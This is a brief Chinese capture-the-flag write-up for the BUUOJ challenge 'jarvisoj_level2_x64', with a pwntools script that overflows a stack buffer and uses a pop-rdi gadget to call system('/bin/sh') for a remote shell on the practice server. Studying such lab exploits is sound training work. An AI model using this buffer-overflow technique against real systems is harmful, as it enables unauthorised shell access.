[https://buuoj.cn/challenges#jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1772513480272-ecedb8cc-9bbe-4906-b760-8e9d02764652.png)

啥也没开

有system，有binsh，还有漏洞函数，我们直接写就行

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1772513526440-7713fd2c-76da-4e3d-9d76-0f9e97be11a4.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1772513555097-3c7dc1be-f9c9-4010-9333-cb7ee85732a9.png)



```python
from pwn import *
r=remote('node5.buuoj.cn',25670)
elf=ELF('./level')

ret=0x4004a1
rdi=0x4006b3
sys=elf.sym['system']
binsh=next(elf.search(b'/bin/sh'))          
payload=b'a'*0x88+p64(rdi)+p64(binsh)+p64(sys)
r.sendline(payload)
r.interactive()
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1772514706666-a72794a3-6d28-49ec-a707-951e297afe7e.png)

